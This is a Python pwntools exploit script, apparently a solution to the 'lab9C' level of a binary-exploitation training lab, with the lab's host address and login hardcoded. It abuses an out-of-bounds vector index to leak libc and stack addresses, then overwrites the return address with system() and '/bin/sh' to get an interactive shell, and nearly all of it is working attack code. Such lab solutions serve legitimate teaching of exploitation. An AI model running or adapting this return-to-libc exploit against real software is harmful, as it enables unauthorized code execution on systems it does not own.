#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 172.17.18.73 --user lab9C --pass lab09start --path /levels/lab09/lab9C
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab9C')
context.terminal = '/bin/bash'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '172.17.18.73'
port = int(args.PORT or 22)
user = args.USER or 'lab9C'
password = args.PASSWORD or 'lab09start'
remote_path = '/levels/lab09/lab9C'

# Connect to the remote SSH server
#shell = None
#if not args.LOCAL:
#    shell = ssh(user, host, port, password)
#    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return connect(host, port)#shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

GET_UNUM = 0xcd9
SYSCALL  = 0xd62
POP_EBX  = 0xa01
SYSTEM   = 0x3cd10


io = start()

buf_addr = None
text_base = None

p = log.progress("Safely moving vector pointer to eip, leaking libc & buf...")
for i in range(1, 261):
    io.sendlineafter("Enter choice:", "2")
    io.sendlineafter("Choose an index:", "%d" % i)
    io.recvuntil("] =")
    num = int(io.readline().strip())
    
    if i == 4:
        libc_base = num - 0x3e14
    elif i == 14:
        buf_addr = num + 0x388
    elif i != 257:
        num = i
    
    io.sendlineafter("Enter choice:", "1")
    io.sendlineafter("Enter a number:", "%d" % num)
p.success("done. " + hex(libc_base) + hex(buf_addr))    


log.info("Smashing return address system()...")
io.sendlineafter("Enter choice:", "1")
io.sendlineafter("Enter a number:", "%d" % (SYSTEM+libc_base))

log.info("Writing fake RA...")
io.sendlineafter("Enter choice:", "1")
io.sendlineafter("Enter a number:", "%d" % u32("FUCK"))

log.info("Writing param system("")...")
io.sendlineafter("Enter choice:", "1")
io.sendlineafter("Enter a number:", "%d" % (buf_addr+12))

log.info("Pushig string system('/bin')...")
io.sendlineafter("Enter choice:", "1")
io.sendlineafter("Enter a number:", "%d" % (u32('/bin')))

log.info("Pushing string system('bin/bash')...")
io.sendlineafter("Enter choice:", "1")
io.sendlineafter("Enter a number:", "%d" % (u32('/sh\x00')))

log.info("Triggering exploit...")
io.sendlineafter("Enter choice:", "3")

#io.send("%d" % (buf_addr+16))

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

